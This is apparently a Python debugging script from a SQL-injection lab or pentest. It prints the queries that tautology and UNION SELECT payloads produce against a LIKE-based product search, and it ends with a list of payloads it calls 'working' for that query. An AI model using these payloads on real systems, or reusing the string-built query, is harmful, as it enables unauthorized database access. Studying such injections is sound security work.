#!/usr/bin/env python
"""
Debug SQL injection to understand why some payloads don't work
"""

# Simulate the vulnerable query construction
def show_query(search_query):
    raw_query = f"""
    SELECT id, name, description, price, created_at, updated_at 
    FROM eshop_product 
    WHERE name LIKE '%%{search_query}%%' 
    OR description LIKE '%%{search_query}%%'
    """
    print(f"\nInput: {search_query}")
    print(f"Generated SQL:\n{raw_query}")
    print("-" * 80)

# Test various payloads
payloads = [
    "' OR '1'='1",
    "' OR 1=1--",
    "' UNION SELECT '11111111-1111-1111-1111-111111111111', 'Hacked', 'Desc', 99, '2024-01-01', '2024-01-01' --",
    "%' OR '1'='1' OR '%'='",
    "%' OR 1=1 OR '%'='",
    "%' UNION SELECT '11111111-1111-1111-1111-111111111111', 'Hacked', 'Desc', 99, '2024-01-01', '2024-01-01' OR '%'='",
]

print("=== SQL Query Debug ===")
print("The query uses LIKE with %% wildcards, which affects injection\n")

for payload in payloads:
    show_query(payload)

print("\n=== Analysis ===")
print("The issue is that the query uses LIKE '%%search%%' which means:")
print("1. Simple ' OR '1'='1 works because it creates: LIKE '%%' OR '1'='1%%'")
print("2. UNION queries fail because they're inside the LIKE clause")
print("3. We need to close the LIKE properly with %' to escape")

print("\n=== Working Payloads for this specific query ===")
working_payloads = [
    "%' OR '1'='1' OR '%'='",
    "%' OR 1=1 OR name LIKE '%",
    "%' UNION SELECT '11111111-1111-1111-1111-111111111111', sqlite_version(), 'Version', 0, '2024-01-01', '2024-01-01' WHERE '' = '",
]

for payload in working_payloads:
    show_query(payload)